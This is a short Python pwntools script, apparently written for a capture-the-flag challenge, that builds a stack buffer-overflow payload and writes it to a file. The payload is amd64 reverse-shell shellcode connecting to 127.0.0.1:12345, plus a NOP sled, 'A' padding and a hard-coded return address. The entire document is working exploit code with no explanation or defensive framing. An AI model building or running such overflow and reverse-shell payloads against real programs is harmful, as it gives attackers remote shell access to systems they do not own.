from pwn import *
context.arch='amd64'
context.os='linux'


s_code = shellcraft.amd64.linux.connect('127.0.0.1', 12345) + shellcraft.amd64.linux.dupsh('rbp')

s_code_asm = asm(s_code)

ret_addr = 0x7FFFFFFFDA88 - 551
addr = p64(ret_addr, endian ='little')

nop = asm('nop', arch="amd64")

payload = b"2\n" + b"A"*1022

payload += nop*(551 - len(s_code_asm) - 64) + s_code_asm + nop*64 + addr

with open("./payload_challenge1", "wb") as f: 
	f.write(payload)
